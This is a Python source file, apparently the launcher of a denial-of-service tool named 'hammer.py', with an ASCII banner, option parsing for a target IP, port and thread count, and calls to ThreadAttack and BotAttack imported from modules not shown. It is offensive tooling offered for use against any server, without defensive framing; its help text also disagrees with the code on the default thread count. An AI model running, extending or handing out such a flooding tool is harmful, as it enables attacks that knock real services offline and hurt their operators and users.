
from optparse import OptionParser
import sys


from core.target import Target
from core.attack import ThreadAttack, BotAttack
from core.common import colors


def chaos_art():
    print(colors.GREEN + '''
                                                                  
@@@  @@@   @@@@@@   @@@@@@@@@@   @@@@@@@@@@   @@@@@@@@  @@@@@@@   
@@@  @@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@! @@! @@!  @@! @@! @@!  @@!       @@!  @@@  
!@!  @!@  !@!  @!@  !@! !@! !@!  !@! !@! !@!  !@!       !@!  @!@  
@!@!@!@!  @!@!@!@!  @!! !!@ @!@  @!! !!@ @!@  @!!!:!    @!@!!@!   
!!!@!!!!  !!!@!!!!  !@!   ! !@!  !@!   ! !@!  !!!!!:    !!@!@!    
!!:  !!!  !!:  !!!  !!:     !!:  !!:     !!:  !!:       !!: :!!   
:!:  !:!  :!:  !:!  :!:     :!:  :!:     :!:  :!:       :!:  !:!  
::   :::  ::   :::  :::     ::   :::     ::    :: ::::  ::   :::  
 :   : :   :   : :   :      :     :      :    : :: ::    :   : :  
                                                                   \n''', colors.ENDC)


def usage():
    print(colors.GREEN + '''
 usage : python3 hammer.py [-s] [-p] [-t]
 -h : help
 -s : target server ip
 -p : target port (default 80)
 -t : turbo (default 150) 
 -B : use only bots (default false)
 -T : use only threads (default false)

 \n''', colors.ENDC)
    sys.exit()


def get_parameters():
    optp = OptionParser(add_help_option=False, epilog="Chaos")
    optp.add_option("-s", "--server", dest="host", help="target server ip")
    optp.add_option("-p", "--port", type="int", dest="port",
                    help="target port (default 80)")
    optp.add_option("-t", "--turbo", type="int",
                    dest="turbo", help="turbo (default 400")
    optp.add_option("-h", "--help", dest="help",
                    action='store_true', help="help you")
    optp.add_option("-B", "--only_bots", dest="only_bots",
                    action='store_true', help="use only bots")
    optp.add_option("-T", "--only_threads", dest="only_threads",
                    action='store_true', help="use only threads")

    opts, args = optp.parse_args()

    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 400
    else:
        thr = opts.turbo
    if opts.only_bots:
        only_bots = True
    else:
        only_bots = False
    if opts.only_threads:
        only_threads = True
    else:
        only_threads = False


    return host, port, thr, only_bots, only_threads


if __name__ == '__main__':
    chaos_art()
    if len(sys.argv) < 2:
        usage()

    host, port, thr, only_bots, only_threads = get_parameters()
    print(colors.GREEN, "server: ", host, " port: ",
          str(port), " turbo: ", str(thr), colors.ENDC)

    target = Target(host, port)
    target.check()

    if only_bots:
        BotAttack(target, thr)
    elif only_threads:
        ThreadAttack(target, thr)
    else:
        ThreadAttack(target, thr)
        BotAttack(target, thr)
        
    while True:
        try:
            pass
        except KeyboardInterrupt:
            sys.exit()
